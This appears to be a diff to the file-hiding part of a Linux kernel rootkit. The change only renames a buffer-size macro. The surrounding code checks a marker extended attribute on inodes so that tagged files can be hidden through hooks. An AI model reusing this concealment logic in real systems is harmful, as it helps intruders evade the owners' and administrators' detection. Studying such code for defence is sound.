@@ -9,7 +9,7 @@
 #include "filehide.h"
 #include "hook.h"
 
-#define SIZE 64
+#define BUFLEN 64
 
 void
 hide_files(void)
@@ -33,11 +33,11 @@ unhide_files(void)
 unsigned long
 must_hide_inode(struct dentry *dentry)
 {
-    char buf[SIZE];
+    char buf[BUFLEN];
 
     if(dentry && dentry->d_inode)
         if(!inode_permission(dentry->d_inode, MAY_READ)) {
-            ssize_t len = vfs_getxattr(dentry, G7_XATTR_NAME, buf, SIZE);
+            ssize_t len = vfs_getxattr(dentry, G7_XATTR_NAME, buf, BUFLEN);
 
             if (len > 0 && !strncmp(G7_XATTR_VAL, buf, strlen(G7_XATTR_VAL)))
                 return dentry->d_inode->i_ino;
